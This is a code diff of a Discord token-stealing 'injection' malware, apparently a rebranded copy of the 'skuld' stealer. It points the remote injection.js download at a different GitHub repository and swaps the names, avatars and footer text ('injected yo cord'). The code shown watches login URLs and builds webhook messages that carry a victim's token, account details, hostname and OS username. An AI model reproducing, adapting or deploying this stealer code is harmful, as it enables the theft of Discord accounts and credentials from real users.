@@ -13,7 +13,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/ZaddyWaddy/repo/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
@@ -151,8 +151,8 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "skuld - cord injection";
-    content["avatar_url"] = "https://i.ibb.co/GJGXzGX/discord-avatar-512-FCWUJ.png";
+    content["username"] = "cordddd";
+    content["avatar_url"] = "https://xerooo.rf.gd/kkk.jpg";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -160,8 +160,8 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "skuld discord injection - made by hackirby",
-        "icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
+        "text": "injected yo cord",
+        "icon_url": "https://xerooo.rf.gd/kkk.jpg",
     };
     content["embeds"][0]["title"] = "Account Information";
 
